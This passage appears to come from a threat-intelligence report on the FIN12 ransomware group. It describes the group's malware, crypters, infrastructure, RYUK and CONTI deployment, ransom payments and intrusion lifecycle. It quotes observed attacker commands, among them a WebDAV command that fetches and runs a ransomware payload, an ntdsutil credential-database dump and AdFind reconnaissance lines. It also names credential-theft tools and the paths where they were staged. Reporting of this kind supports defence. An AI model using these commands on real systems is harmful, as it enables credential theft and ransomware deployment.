was\netnbhivw5fjqytbmvt2o6zle3avqn6rrugfc35kmcmedbbgqbxtknl\nqd[.]onion, which has been used in FIN12 intrusions (Figure 8).\n\n\n-----\n\n**FIGURE 7. RYUK ransom note HTML page on GRIMAGENT C&C domain.**\n\n**FIGURE 8. TOR payment domain embedded in HTML.**\n\nFIN12 has sometimes used GRIMAGENT as a foothold in the environment earlier in intrusions, and in other cases it was used to maintain\naccess to critical machines including domain controllers later in intrusions. FIN12 has staged GRIMAGENT in the C:\\PerfLogs and C:\\\nUsers\\Public\\Music directory and the files often masquerade as system files or installation scripts for common software:\n\n\n\n- chrome.exe\n\n- explorer.exe\n\n- pagefile<random_alpha_chars>.exe\n\n- swapfile<random_alpha_chars>.exe\n\n\n\n- swchost.exe\n\n- tmuninst<random_alpha_chars>.exe\n\n- toolbox_client_uninst<random_alphanumeric>.exe\n\n\n-----\n\n###### Use of Criminal Services\nFIN12 has consistently relied on a small arsenal of tools, limited\nalmost exclusively to malware in the TRICKBOT ecosystem and\npublicly available utilities or attack frameworks. Despite the\noverarching pattern, FIN12 has still intermittently used a variety\nof other malware and services possibly acquired from the\ncriminal underground.\n\n###### Malware\nFIN12 commonly uses SYSTEMBC malware to proxy remote\nconnections to hosts within victim environments. SYSTEMBC\nis sold publicly on Exploit[.]in by the Russian-speaking actor\n\"psevdo\" and has been leveraged by multiple disparate threat\n[clusters (21-00007472).](https://intelligence.fireeye.com/reports/21-00007472)\n\n###### Crypting (In-Memory Droppers)\nFIN12 has leveraged various in-memory droppers to load malware\npayloads. At least some of these droppers appear to only be\nused by threat clusters and malware families that have known\nassociations with FIN12, such as initial access providers. The\nintegration of the publicly available DAVESHELL launcher into\nseveral related in-memory droppers may also suggest that at\nleast some crypting services are provided by a common actor.\n\n**TABLE 3. In-memory dropper summary.**\n\n**Dropper Family** **ICECANDLE** **MALTSHAKE**\n\nMalware Families BEACON EMOTET\nBUER RYUK\nBAZARLOADER.KEGTAP SYSTEMBC\nRYUK TRICKBOT\nBAZARLOADER.SINGLEMALT\nSYSTEMBC\n\n###### Code Signing Certificates\nFIN12 has frequently leveraged code-signed payloads in their\noperations. Their code-signing certificates have been issued\nby common certificate authorities, including DigiCert, Sectigo\n(Comodo), and Certum. In several instances, these certificates\ncontained common names associated with seemingly legitimate\nbusinesses, suggesting the organizations' information was used\nto fraudulently purchase certificates. While we have not linked\nany FIN12 certificates to specific vendors in criminal markets, it\nis plausible that FIN12 has obtained certificates from a criminal\nservice provider.\n\n- FIN12 has used certificates and common names that have also\n\nbeen used to sign payloads attributed to other threat clusters.\nThese overlaps across distinct clusters of activity may\n\n\nWhile we have not identified these droppers for sale in public\nunderground forums, it is also common for threat actors to offer\ntools or services privately to a smaller group of threat actors.\n\n- FIN12 has used several in-memory droppers to load various\n\npayloads including BEACON, SYSTEMBC, and RYUK. These\ndroppers also act as crypters, obfuscating the payload and\ncomplicating detection. We do not believe that these droppers\nare exclusive to FIN12. Further, trusted sensitive sources\nindicate that payloads using at least some of these droppers\nmay be sourced from a shared partner that provides private\ncrypting services for a limited set of actors.\n\n- Some of the droppers have been used with malware families\n\nthat we have no evidence to suggest are used by FIN12;\nhowever, in some cases, these families are used by actors\nthat have served as initial access providers for FIN12 (Table 3).\nSpecifically, ICECANDLE, MALTSHAKE, and WHITEDAGGER\nhave all been used to drop TRICKBOT payloads. We have\nidentified numerous actors associated with TRICKBOT seeking\n[crypters to enable their operations including Hostess, khano,](https://intelligence.fireeye.com/reports/21-00018364)\n[and SpongeB. This further supports the possibility that at least](https://intelligence.fireeye.com/reports/20-00025832)\nsome overlaps in dropper usage are due to a common threat\nactor providing these services.\n\n**WEIRDLOOP** **WHITEDAGGER**\n\nBEACON BEACON\nCAMPOLOADER\nDFDOWNLOADER\nEMOTET\nICEDID\nBAZARLOADER.KEGTAP\nBAZARLOADER.LOUDPOP\nROLLBACK\nRYUK\nSNOWCONE\nSYSTEMBC\nTRICKBOT\nVIDAR\n\nsuggest that the certificates were procured from a common\nactor or service.\n\n– A cluster of NETSUPPORT activity in August 2020 used\n\npayloads signed with a Sectigo certificate using the common\nname \"Bespoke Software Solutions Limited.\"\n\n– In October 2020, FIN12 and UNC2053 used signed payloads\n\nwith a certificate issued by DigiCert and also using the\ncommon name \"Bespoke Software Solutions Limited.\"\n\n###### Bulletproof Hosting\nFIN12 has used bulletproof hosting services offered on Exploit[.]\nin by an actor known as \"yalishanda.\" This service was used for\ntheir GRIMAGENT C&C domains. Additionally, RYUK victim contact\npages and BEACON payloads attributed to FIN12 have used the\n\nb ll t f h ti i f t t\n\n\n-----\n\n###### Monetization\nAfter acquiring access to victim environments, FIN12 progresses\n[relatively quickly to deploy ransomware. In M-Trends 2021, the](https://content.fireeye.com/m-trends/rpt-m-trends-2021)\nmedian dwell time for all ransomware investigations was five days,\nwhereas across FIN12 engagements it was less than two days.\nNotably, while FIN12's average time-to-ransom (TTR) is 3.97 (three\ndays, 20 hours, 20 minutes), the threat actors have improved their\nspeed year-over-year (Figure 9). Across these incidents, FIN12\nhas almost exclusively deployed RYUK ransomware. However, in\n\n##### TIME TO RANSOM FIN12\n\n\none instance, FIN12 deployed CONTI ransomware. In this incident,\nthey also extorted the organization for the non-release of stolen\ndata. Notably, while the majority of RYUK ransomware incidents\nthat Mandiant has responded to are attributed to FIN12, we do not\nbelieve that the ransomware is exclusively used by these threat\n[actors (21-00019652). FIN12 has used multiple, distinct TTPs related](https://intelligence.fireeye.com/reports/21-00019652)\nto their deployment of RYUK and CONTI, which helps to distinguish\ntheir activity, including the use of specific scripts, staging\ndirectories, and file naming conventions.\n\n\n###### 5\n\n 4\n\n\n###### 3\n\n 2\n\n\n###### 1\n\n\n###### 0\n\n**FIGURE 9.

During multiple incidents,\nthere has been evidence that FIN12 stages a ZIP archive with the\n\n\nfilename share$.zip in the C:\\PerfLogs directory on a domain\ncontroller. This ZIP archive contains multiple files used to deploy\nransomware across the network. Table 4 lists the typical names\nand functionality of these files and Figures 10–12 show example\ncontents of the batch scripts.\n\n\n**TABLE 4. Typical share$.zip archive contents.**\n\n|TABLE 4.

Example EXE.bat script snippet.**\n\nIn at least one instance, we observed FIN12 use distinct batch\nscripts designed to perform the same copy and execute tasks\nusing PowerShell. These scripts, named _CopyPS.bat and\nStartPS.bat, contain code that creates a network share, sets\npermissions for the share, copies a PowerShell script named\nRUN_task.ps1 and comps<##>.txt files, and executes RUN_task.\nps1 using the comps<##>.txt files as arguments. RUN_task.ps1\ncreates a scheduled task that executes the ransomware payloads\nfive minutes after scheduled task creation.\n\nFIN12 makes regular use of the C:\\share$ directory for staging\nof ransomware and related scripts. These threat actors have\ncommonly, but not exclusively, used the filename xxx.exe for its\nransomware payloads. In some earlier instances, FIN12 used the\nnaming convention t<#>-<##>.exe and in other instances, have\nused other filenames with repeating characters, such as fff.exe,\nor seemingly random characters.\n\nWhile the majority of FIN12 ransomware deployment has\nleveraged scripts like those described, we have observed\nvarious other methods, including manual deployment via RDP,\nself-propagation functionality built into a RYUK, and at least\none instance where the group deployed ransomware using\nGroup Policy Objects (GPOs) and Web Distributed Authoring and\nVersioning (WebDAV). These divergent deployment methods\n\n\nare interspersed throughout FIN12's known activity. These\nattempts have sometimes occurred in environments where the\naforementioned deployment scripts were also observed. This\nsuggests that, in some cases, FIN12 may use alternative methods\nwhen the scripts do not perform satisfactorily.\n\n- FIN12 has deployed RYUK manually via RDP in multiple intrusions.\n\nThese incidents have included the following scenarios:\n\n– the ransomware was exclusively deployed via RDP,\n\n– the deployment scripts were also present, but may not have\n\nbeen successful,\n\n– after successfully using the deployment scripts, the threat\n\nactors used RDP to access and encrypt machines being used\nto maintain a foothold in the network.\n\n- In some cases, FIN12 has relied on self-propagation functionality\n\nbuilt into some variants of RYUK. This has included leveraging\nRYUK's \"8 LAN\" argument, which enumerates the ARP table\nand attempts to spread to existing network shares as well as a\nRYUK variant that employs compromised domain administrator\naccount credentials to spread through the network.\n\n- In at least one incident, FIN12 used GPOs, scheduled tasks, and\n\nWebDAV to execute a RYUK payload hosted on a network file\nshare (Figure 13). The WMI script deployment method was also\nobserved in this incident.\n\n```\nrundll32.exe C:\\WINDOWS\\system32\\davclnt.dll,DavSetCookie <IP Address> http://<IP\nAddress>/share$/xxx.exe\n\n```\n\n**FIGURE 13. Example WebDAV ransomware deployment command.**\n\n\n-----\n\n###### Data Theft\nWhile data theft extortion is relatively common in ransomware\nintrusions carried out by other ransomware deployment groups,\nwe have observed FIN12 exfiltrate data from victim environments\nin a limited number of instances and only once leverage this data\nfor extortion. FIN12's decision to refrain from stealing victim data\nand publicly shaming victims may have multiple explanations, but\nmost significantly, the threat actors' probable desire to prioritize\nspeed. The average time to ransom (TTR) across our FIN12\nengagements involving data theft was 12.4 days (12 days, 9 hours,\n44 minutes) compared to 2.48 days (2 days, 11 hours, 37 minutes)\nwhere data theft was not observed. FIN12's apparent success\nwithout the need to incorporate additional extortion methods\nlikely reinforces this notion.\n\n- The incident involving data theft extortion is also FIN12's lone\n\ninstance of CONTI ransomware deployment. In this incident, the\nthreat actors exfiltrated approximately 90 GB of data to various\ncloud storage providers including filetransfer.io, filemail.net,\nsendspace.com, and dropbox.com. Notably, in the second\nattempt, the victim organization was contacted via Facebook\nMessenger, although we cannot definitively attribute it to FIN12\ndue to the mechanism used for communication.\n\n- In RYUK incidents with confirmed data theft, we did not\n\nidentify evidence that this data was subsequently leveraged\nfor extortion. In these cases, data was exfiltrated to actorcontrolled machines rather than cloud storage providers.\n\n**FIGURE 14. Early RYUK ransom note.**\n\n\n###### Ransomware Negotiations\nEarly RYUK ransom notes contained one or two Protonmail email\naddresses for the victim to contact in order to negotiate payment\nfor a decryptor (Figure 14). The threat actors managed these email\ncommunications through an attacker-controlled panel that we\nsuspect was likely used to correspond with the victims of multiple\ngroups distributing RYUK. Beginning in November 2020, the RYUK\nsamples distributed by FIN12 and other groups deploying this\nsame malware began to direct users to a victim communication\nportal. This simultaneous transition across intrusion groups to a\ncommunication portal likely suggests that no one of these groups\nis maintaining RYUK ransomware themselves and they likely have\ncommon association to a central RYUK developer or service.\n\n- Mandiant identified a panel used by threat actors between\n\nJanuary 2019 and March 2020 to communicate and manage\nransom negotiations with RYUK victims via ProtonMail accounts\n[(20-00005132). We reviewed correspondence with some FIN12](https://intelligence.fireeye.com/reports/20-00005132)\nvictims who attempted to negotiate their ransom amount;\nnotably, other FIN12 victims may not have appeared within this\ndataset if they chose not to engage the threat actors.\n\n– We do not believe that this panel was exclusively used for\n\nnegotiations with FIN12 victims based on the volume of\nnegotiations and the identification of other victims whose\ncompromises we do not attribute to FIN12.\n\n- After resuming activities in August 2020, samples of RYUK\n\ndistributed by FIN12 continued to leverage ProtonMail email\naddresses in their ransom notes, which may indicate that RYUK\nwas still leveraging the same communication panel at this time.\nHowever, in November 2020, these ransom notes changed to\ninclude a contact button and a TOR URL, which suggests that a\nnew panel was being used for RYUK victim negotiations.\n\n\n-----\n\n**FIGURE 15. Recent RYUK ransom note.**\n\n**FIGURE 16. RYUK victim communication login page.**\n\n\n-----\n\n###### Bitcoin Transactions\nMandiant analyzed a limited set of Bitcoin wallet transactions\nthat were associated with payments made by FIN12 victims. We\nassess with high confidence that victim payments are split among\nvarious threat actors, which is consistent with our belief that\nFIN12 leverages initial access providers, and likely other partners,\nto complete all aspects of the attack lifecycle. In several of the\ntransactions, a portion of the victim funds were cashed out at\ncryptocurrency exchange services, including Huobi and Binance.\n\n- In multiple cases, we saw evidence of victim payments being\n\ndivided among seemingly disparate Bitcoin wallets. For\nexample, in one case, 30–35% of the victim payment was\nsubsequently sent to a wallet associated with a suspected initial\naccess provider.\n\n- The subdivision of profits after payment is consistent with\n\nransomware operations more broadly, where access providers,\npartners with specific skillsets (e.g., penetration testers), and/\nor ransomware operators receive a portion of a successful\nransom payment.\n\n###### FIN12 Origin\nWe suspect that FIN12 is likely comprised of Russian-speaking\nactors who may be located in countries in the Commonwealth\nof Independent States (CIS). FIN12 has not targeted CIS-based\norganizations and identified partners, and all currently identified\nRYUK users have spoken Russian. Additionally, GRIMAGENT\nmalware, which we have only observed in FIN12 incidents to date,\ncontains Russian-language file resources including graphical\ncomponents containing Russian text (Figure 17). These graphical\nresources include a menu that displays an \"About\" dialog box.\n\n\n###### Outlook and Implications\nIt has become relatively common for actors to specialize\nin specific stages of the attack lifecycle and for groups to\noutsource different aspects of their operations to other\n[actors (21-00012276). This trend has been particularly evident](https://intelligence.fireeye.com/reports/21-00012276)\nin ransomware operations in recent years, including those\nconducted by FIN12. Notably, FIN12's reliance on other threat\nactors to obtain initial access to organizations has allowed\nthem to focus specifically on ransomware deployment. In\nthe first half of 2021, as compared to 2020, FIN12 was able to\nsignificantly improve their TTR, cutting it in half to just 2.5 days.\nThese efficiency gains are likely due at least in part to their\nspecialization in a single phase of the attack lifecycle, allowing\nthem to develop their expertise more quickly.\n\nFIN12 has also seemingly made a deliberate choice to prioritize\nspeed, as we've rarely observed these threat actors engage in\ndata theft extortion. However, it is plausible that these threat\nactors may evolve their operations to more frequently incorporate\ndata theft in the future. For example, FIN12 could identify certain\nindustries that weigh the threat of data exposure more heavily than\ndowntime caused by a ransomware attack and chose to employ this\ntactic against those targets if they are deemed to be of particularly\nhigh value. Additionally, we are seeing some evidence that FIN12\nhas started to work more closely with an increasingly diverse group\nof partners. While observed changes have thus far been limited\nto their use of initial access providers, if FIN12 closely aligns itself\nwith another ransomware service that maintains a shaming site,\nthese threat actors may begin to incorporate data theft into their\nransomware operations more frequently.\n\n\nBeyond the expansion in initial access vectors leveraged by FIN12,\nwe expect their regional targeting to continue to broaden. There\nhas been significant attention from the U.S. government on the\nthreat posed by ransomware in recent years, resulting in various\n[steps curtail the threat including sanctions and the threat of](https://home.treasury.gov/system/files/126/ofac_ransomware_advisory.pdf)\nfuture sanctions against threat actors deploying ransomware and\nservices used by these actors to facilitate financial transactions.\nThis elevated, unwanted attention may make the U.S.-based\norganizations less desirable target for FIN12 who may shift their\nattention to organizations operating in other areas of the world\nincluding nations in Western Europe and the Asia Pacific region.\n**FIGURE 17. GRIMAGENT dialog box.**\n\n\n-----\n\n###### Appendix 1: Overlaps with TRICKBOT and Affiliated Actors\nFIN12 shares a close working relationship with actors associated\nwith the development of TRICKBOT and related families, which\ninclude BAZARLOADER, BAZARBACKDOOR, and ANCHOR. In\nsome cases, it appears that these relationships may lead to\nresource sharing including the use of malware that is atypical for\nFIN12 intrusions. Beyond leveraging accesses obtained via these\nfamilies both FIN12 and TRICKBOT-adjacent activity commonly\nuse overlapping toolsets and services including backdoors,\ndroppers, and code-signing certificates. Despite these overlaps,\nwe track FIN12 as a distinct threat actor given their specific role in\nthe deployment of ransomware and their demonstrated ability to\nwork independently.\n\n- FIN12 intrusions have frequently followed campaigns delivering\n\neither TRICKBOT or BAZARLOADER. We have previously\nreported on technical overlaps between the BAZARLOADER\n[and BAZARBACKDOOR families with TRICKBOT (20-00007310).](https://intelligence.fireeye.com/reports/20-00007310)\nNotably, these families emerged following TRICKBOT's\nincreasing use as a foothold for interactive post-exploitation\nactivity, instead of as a traditional banking malware. We believe\nthat these loader and backdoor combinations were purposefully\ndeveloped to support this shift. Thus, it is unsurprising that\nafter FIN12's reemergence in September 2020, they often\nleveraged accesses obtained from BAZARLOADER instead of\nTRICKBOT.\n\n- Mandiant has only directly observed FIN12 deploy CONTI\n\nransomware in one case. Based on information from various\nsources, we have high confidence that the management and\ndevelopment staff of CONTI and TRICKBOT are closely aligned\n[(21-00011771). Besides the use of CONTI, other TTPs observed](https://intelligence.fireeye.com/reports/21-00011771)\nin the aforementioned incident were consistent with FIN12,\nincluding leveraging TRICKBOT for initial access. It is plausible\nthat given data theft also occurred, FIN12 chose to instead\ndeploy CONTI because they maintain a shaming website.\n\n\n\n- The ANCHOR backdoor has been seen across a subset of\n\nintrusions associated with FIN12. We believe it is associated\nwith the operators of TRICKBOT based on overlapping C&C\ninfrastructure and similarities in HTTP communication with\n[TRICKBOT. Further, a CISA alert in October 2020 explicitly stated](https://us-cert.cisa.gov/ncas/alerts/aa20-302a)\nthat it was created by the TRICKBOT developers. ANCHOR is\nnot distributed widely and appears to be used as a later stage\nbackdoor to maintain access to victim environments. We have\nsome evidence that FIN12 has been directly responsible for\nits deployment in at least one case, which may suggest that\nthey were testing the efficacy of this malware. However, it is\nalso possible that in some cases FIN12 could receive access to\nANCHOR-infected hosts given the existing partnerships they\nmaintain with TRICKBOT-affiliated actors.\n\n- FIN12 has used various droppers or crypters that have also\n\nbeen used to deliver TRICKBOT and BAZARLOADER among\nother malware (Table 5). Based on information from sensitive\nsources, we believe that the actors behind the development\nand management of TRICKBOT also employ actors who provide\ncrypting services to their partners and affiliates.\n\n- FIN12 malware payloads are commonly code-signed. In multiple\n\ninstances, FIN12 payloads have shared overlapping code-signing\ncertificates with UNC2053, suggesting that both groups may\nrely upon a common actor(s) and/or service for provisioning and\nsigning malware payloads (Table 6).\n\nFurther, the operators of TRICKBOT have many affiliates\nresponsible for the distribution of their malware and maintain\npartnerships with various threat actors who deploy ransomware.\nMandiant has identified multiple actors operating in underground\nforums who are affiliated with TRICKBOT seeking partners –\nincluding “pentesters” – for ransomware operations. In one case,\nwe identified that the threat actors who used CONTI had access\nto ANCHOR malware and in a separate case, we identified that the\nthreat actors who used RYUK (tracked as UNC2840) had access\nto a TRICKBOT administration panel. These instances as well as\nother observations illustrate that there are multiple groups of\ndistinct intrusions operators leveraging TRICKBOT and related\nmalware within their operations.\n\n\n-----\n\n**TABLE 6.

While\naccess can be handed off from one threat group to another through\nmany different methods, FIN12 intrusion activity has most recently\nstarted with BEACON or GRIMAGENT payloads being delivered as a\nsecond stage to other malware or directly via phishing campaigns\nwe attribute to malware distribution operations. Early FIN12\nincidents involved use of the EMPIRE post-exploitation framework,\nwhich was deployed via TRICKBOT. Although we have insufficient\nevidence to attribute any TRICKBOT activity to FIN12, in some of the\nearliest known FIN12 intrusions TRICKBOT was used to progress\nthrough the establish foothold, internal reconnaissance, lateral\nmovement, and maintain presence phases of the attack lifecycle\nprior to the deployment of FIN12 attributed EMPIRE payloads. In\nlimited cases, FIN12 has used payloads associated with other postexploitation frameworks, including METERPRETER (Metasploit) and\nGRUNT (Covenant).\n\n###### Escalate Privileges\nFIN12 largely relies on access to valid credentials for privilege\nescalation. We have observed the group obtain credentials\nthrough a variety of methods, including dumping lsass.exe\nmemory, extracting password hashes from the NTDS.dit file,\nusing various kerberoasting utilities, using the LAZAGNE\ncredential stealer, and using credential theft PowerShell cmdlets,\nincluding Invoke-WCMDump, Get-GPPPassword, and FindGPOPasswords. FIN12 has also used process injection to execute\npayloads in a more privileged context. In many cases, these\ntactics were used in conjunction with post-intrusion frameworks\nsuch as Cobalt Strike, EMPIRE, and Metasploit.\n\n- FIN12 has occasionally leveraged the open-source credential\n\ntheft tool LAZAGNE. They have used LAZAGNE with the\nfollowing path and filename on multiple occasions: C:\\Windows\\\nTemp\\Gtt654f\\lazagne.exe.\n\n- FIN12 has leveraged various publicly available tools to access\n\ncredentials via kerberoasting attacks. These tools have\nincluded KERBRUTE, RUBEUS, and the Invoke-Kerberoast\nPowerShell cmdlet. KERBRUTE has been observed in the C:\\\nPerfLogs\\ directory with the names k32.exe and k64.exe.\nRUBEUS output has been observed with the filename rubeus_\nout.txt.\n\n\n\n- FIN12 has used various methods to collect the NTDS.dit file\n\nand the SYSYEM and SECURITY registry hives to gain access to\npassword hashes. These methods include creating a Volume\nShadow Copy and using a batch script named 1.bat, which\ncollects NTDS.dit using the Windows ntdsutil utility (Figure 19).\nFIN12 then archives this data for exfiltration. These files have\nbeen observed in the C:\\PerfLogs\\1\\ and C:\\Users\\1\\ directories.\n\n- FIN12 has dumped the lsass.exe process to access credentials\n\nin memory. In some cases, we have observed the group\nmodifying the WDigest registry key to allow plaintext\ncredentials to be cached in memory. The process memory is\nthen dumped using the Procdump utility or the Get-Process and\nOut-Minidump PowerShell cmdlets.\n\n```\nntdsutil \"ac in ntds\" \"ifm\" \"cr fu C:\\\nPerflogs\\1\" q q\n\n```\n\n**FIGURE 19. Example 1.bat contents.**\n\n###### Internal Reconnaissance\nFIN12 has almost exclusively used publicly available malware,\ntools, and utilities to perform internal reconnaissance. In many\ncases, these tools and scripts are executed via BEACON or\nEMPIRE. These tools are vital to their operation as they seek\nto elevate their privilege level and identify hosts to target for\nencryption.\n\n- FIN12 has frequently used the publicly available AdFind\n\nActive Directory reconnaissance tool. Specifically, FIN12 has\nstaged ZIP archives named adf.zip, which contain an AdFind\nexecutable, and a batch script named adf.bat. The batch script\ncontains commands to execute AdFind in various modes and\noutput the contents to text files.\n\n– While the use of AdFind and the batch script itself appears\n\nrelatively generic, on multiple occasions we have observed\nFIN12 use a specific version of this batch script, which\nincludes a command that is likely a remnant from a previous\nintrusion (Figure 20).\n\n– This command referencing a directory that would not exist on\n\nmost hosts would have no impact on its successful execution\nso long as adfind.exe is in the same directory as the script.\nA script containing this error is unlikely to be seen across\nintrusions unless in use by a single threat actor or shared\nbetween members of the same community by the actor who\nfirst introduced the error.\n\n\n-----\n\n- Get-DataInfo.ps1 is a reconnaissance PowerShell script that has\n\nbeen used regularly by FIN12. This script scans the network to\nidentify all active hosts, and collects information about them,\nincluding disk info, installed security software, installed backup\nsoftware, it then archives the results in a ZIP file. Get-DataInfo.\nps1 has been observed in directories named \"grub.info.test,\"\n\"grub.info.test2,\" or \"grub.info.test3.\" This directory has also\nbeen used to stage files used to launch the script and support\nits functionality (Table 7).\n\n- FIN12 has frequently leveraged Microsoft's Get-ADComputer\n\nPowerShell cmdlet to collect Active Directory data including\nnames, DNS hostnames, operating system information, last\n\n\nlogon dates, and IP addresses. The group has regularly used the\ncommand shown in Figure 21 to export the collected data to a\nfile named AllWindows.csv prior to exfiltration.\n\n- FIN12 has used other built-in or publicly available tools for\n\nActive Directory reconnaissance including BLOODHOUND\n(Invoke-Bloodhound), and the Windows net and nltest\ncommand line utilities.\n\n- Other network reconnaissance tools observed during FIN12\n\nintrusions include Advanced IP Scanner, MASSSCAN, Nirsoft\nPingInfoView, SoftPerfect Network Scanner, and various\nPowerShell cmdlets. The group also makes regular use of builtin Windows commands for reconnaissance.\n\n```\ncd /d \"C:\\Users\\SVC-DA~1\\AppData\\Local\\Temp\\10\\tmp$\\Downloads\"\nadfind.exe -f \"(objectcategory=person)\" > ad_users.txt\nadfind.exe -f \"objectcategory=computer\" > ad_computers.txt\nadfind.exe -f \"(objectcategory=organizationalUnit)\" > ad_ous.txt\nadfind.exe -sc trustdmp > trustdmp.txt\nadfind.exe -subnets -f (objectCategory=subnet)> subnets.txt\nadfind.exe -f \"(objectcategory=group)\" > ad_group.txt\nadfind.exe -gcb -sc trustdmp > trustdmp.txt\n\n```\n\n**FIGURE 20.

Get-ADComputer command.**\n\n\n-----\n\n###### Lateral Movement\nFIN12 has most commonly moved laterally across victim\nenvironments using valid credentials in combination with\nBEACON, EMPIRE, RDP, and SMB.\n\n- FIN12 has deployed ransomware and other malware using batch\n\nscripts that leverage PsExec, WMIC, BITSadmin or PowerShell\nto copy and execute payloads on remote machines.\n\n- In some intrusions, FIN12 actors have used RDP to move laterally\n\nand deploy RYUK interactively.\n\n- FIN12 has used the Invoke-SMBExec PowerShell cmdlet to\n\nexecute the pass-the-hash technique using stolen password\nhashes to move laterally.\n\n###### Maintain Presence\nFIN12 has used several tactics to maintain presence in victim\nenvironments including leveraging valid credentials, built-in malware\npersistence mechanisms, and disabling security software.\n\n- FIN12 has used valid credentials for existing Active Directory\n\naccounts and has also created and used new accounts within\nvictims' Active Directory environments.\n\n– We have observed the group obtain credentials through a\n\nvariety of methods including dumping lsass.exe memory,\nextracting password hashed from the NTDS.dit file, using\nvarious kerberoasting utilities, using the LAZAGNE credential\nstealer, and using credential theft PowerShell cmdlets\nincluding Invoke-WCMDump, Get-GPPPassword, and FindGPOPasswords.\n\n– FIN12 has been observed creating local administrator\n\naccounts or attempting to change the passwords for existing\naccounts, including service accounts.\n\n- FIN12 uses several malware families that incorporate\n\nmechanisms to persist through reboot, such as the creation of\nscheduled tasks or Windows services.\n\n– FIN12 has employed Cobalt Strike BEACON, GRIMAGENT,\n\nANCHOR, and SYSTEMBC, which may maintain persistence\nthrough reboot via the creation of scheduled tasks.\n\n– FIN12 has used EMPIRE configured to maintain persistence\n\nthrough reboot via a service named \"Updater.\"\n\n- FIN12 has disabled or uninstalled security software.\n\n- SYSTEMBC was first observed in use by FIN12 in early 2020 and\n\nhas been seen frequently at their intrusions since their activity\nresumed in September 2020. FIN12's usage of SYSTEMBC is\noften accompanied by some distinctive TTPs.\n\n– SYSTEMBC executable files use names containing the strings\n\nshost, sock, or wav located in the C:\\Users\\Public\\Music\\ or\nC:\\PerfLogs\\ directory. FIN12 has not delivered SYSTEMBC as\nan initial foothold payload, whereas some other threat actors\nhave delivered the malware through phishing campaigns.\n\n\n###### Complete Mission\nAt all known intrusions where FIN12 has successfully carried\nout their mission their end goal was almost exclusively the\ndeployment of RYUK ransomware. Additionally, we have observed\nat least one instance FIN12 attributed intrusions where they\ndeployed CONTI ransomware. The majority of FIN12 intrusions\nhave not involved data theft for extortion; however, we have\nobserved this in a small number of incidents.\n\n- FIN12 has used multiple methods to deploy ransomware in order\n\nto complete their mission.\n\n– Most commonly, ransomware is deployed using a set of scripts\n\nand text files that copy and execute the ransomware on a list\nof machines collected during the Internal Reconnaissance\nphase on an intrusion. Various scripts have been observed\nthat leverage BITSadmin, GPOs, PowerShell, PsExec, and\nWMIC. In some cases, they have used RDP to access domain\ncontrollers from which they ultimately deploy ransomware.\n\n– FIN12 has also deployed RYUK manually via RDP. This was\n\nsometimes done in cases where deployment scripts were\npresent but may not have worked as intended.\n\n– In some cases, FIN12 has relied on self-propagation\n\nfunctionality built into RYUK. This has included the use of\nRYUK's \"8 LAN\" argument, which enumerates the ARP table\nand attempts to spread to existing network shares. They\nhave also used a variant of RYUK that used compromised\ndomain administrator account credentials to spread through\na network.\n\n– FIN12 has also used GPOs, scheduled tasks, and WebDAV to\n\nexecute RYUK payloads hosted on network file shares.\n\n- FIN12 has been observed using WMIC and vssadmin to manually\n\ndelete volume shadow copies. Additionally, FIN12 has used\nCONTI ransomware, which deletes volume shadow copies\nautomatically using vssadmin.\n\n- In limited instances, FIN12 has been observed exfiltrating stolen\n\nuser data to accounts on various cloud storage providers or\nactor-controlled servers.\n\n\n-----\n\n###### Appendix 3: MITRE ATT&CK Mapping TA0002: Execution\n\n- T1047: Windows Management Instrumentation\n\n-

Malware families.**\n\n|TABLE 8. Malware families.|Col2|\n|---|---|\n|Code Family|Description|\n|ANCHOR BEACON BLOODHOUND CONTI DAVESHELL EMPIRE GRIMAGENT GRUNT ICECANDLE MALTSHAKE RYUK METERPRETER SYSTEMBC WEIRDLOOP WHITEDAGGER|ANCHOR is a backdoor written in C/C++ that communicates via HTTP or DNS. Supported backdoor commands include shell command execution, file download, process injection, and file execution. Downloaded payloads may be written to disk or mapped directly into memory prior to execution. BEACON is a backdoor written in C/C++ that is part of the Cobalt Strike framework. Supported backdoor commands include shell command execution, file transfer, file execution, and file management. BEACON can also capture keystrokes and screenshots as well as act as a proxy server. BEACON may also be tasked with harvesting system credentials, port scanning, and enumerating systems on a network. BEACON communicates with a C&C server via HTTP or DNS. BLOODHOUND is a Windows Active Directory reconnaissance utility used to analyze the relationships between permissions, accounts, and hosts that could allow for privilege escalation or unintended access to resources. CONTI is ransomware written in C/C++ that encrypts local files. Some variants of CONTI are also capable of encrypting files stored on network shares. CONTI may delete volume shadow copies and stop services related to database software, backup solutions, and anti-virus prior to encrypting files. Some CONTI samples accept command-line arguments that allow an attacker to specify a mode of operation as well as a list of system names or file paths to target for encryption. DAVESHELL is a memory-only launcher that loads and executes an embedded PE-formatted payload. EMPIRE is a post-exploitation framework written in PowerShell. EMPIRE is commonly used to generate a stager payload, which is responsible for downloading and executing the framework's backdoor. The backdoor communicates via HTTP and HTTPS. Supported backdoor commands include shell command execution, PowerShell execution, and file transfer. The EMPIRE backdoor can also be extended via plugins. Supported plugins include remote desktop, screenshot capture, keylogging, lateral movement, credential theft, and reconnaissance. GRIMAGENT is a backdoor that can execute arbitrary commands, download files, create and delete scheduled tasks, and execute programs via scheduled tasks or via the ShellExecute API. The malware persists via a randomly named scheduled task and a registry Run key. The backdoor communicates to hard-coded C&C servers via HTTP requests with portions of its network communications encrypted using both asymmetric and symmetric cryptography. Grunt is a multi-stage .NET implant that communicates with the Covenant command and control framework. ICECANDLE is a memory-only dropper that uses the RC4 algorithm to decrypt its payload prior to execution. ICECANDLE leverages the DAVESHELL shellcode launcher. MALTSHAKE is a multi-stage, in-memory dropper written in C++ that executes an embedded payload in memory. MALTSHAKE has exclusively been observed in activity that we attribute to FIN12. RYUK is ransomware written in C that encrypts files stored on local drives and network shares. It also deletes backup files and volume shadow copies. Some RYUK variants can propagate to other systems on a network. METERPRETER is a backdoor written in C that communicates via HTTP, HTTPS, or a custom binary protocol over TCP. Supported commands include reverse shell, file transfer, file execution, keylogging, and screenshot capture. METERPRETER is generated by the METASPLOIT framework. SYSTEMBC is a tunneler written in C that retrieves proxy-related commands from a C&C server using a custom binary protocol over TCP. A C&C server directs SYSTEMBC to act as a proxy between the C&C server and a remote system. SYSTEMBC is also capable of retrieving additional payloads via HTTP. Some variants may use the Tor network for this purpose. Downloaded payloads may be written to disk or mapped directly into memory prior to execution. SYSTEMBC is often used to hide network traffic associated with other malware families. WEIRDLOOP is an in-memory dropper that decodes a payload encoded via stack strings and executes it in memory. WHITEDAGGER is a memory-only dropper written in C/C++ that uses RC4 stream cipher to decrypt an embedded payload to execute it in memory. WHITEDAGGER leverages the DAVESHELL shellcode 